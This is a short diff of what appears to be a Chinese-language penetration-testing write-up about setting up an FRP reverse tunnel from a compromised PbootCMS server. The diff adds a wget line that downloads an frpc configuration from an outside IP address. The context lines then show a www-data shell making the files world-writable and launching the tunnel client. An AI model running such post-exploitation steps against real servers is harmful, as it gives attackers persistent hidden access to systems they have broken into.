@@ -287,6 +287,7 @@ ecs-user@iZuf6cpbx5hvqmv33pteu2Z /h/frp_0.65.0_linux_amd64> ./frps -c ./frps.tom
 
 ### frpc-靶机端（PBOOTCMS）
 ```bash
+wget http://101.132.149.233:4444/frpc.toml
 www-data@iZ8vbgyjachs4g5pjgaopzZ:/tmp$ chmod 777 ./frpc
 www-data@iZ8vbgyjachs4g5pjgaopzZ:/tmp$ chmod 777 ./frpc.toml
 www-data@iZ8vbgyjachs4g5pjgaopzZ:/tmp$ ./frpc -c ./frpc.toml
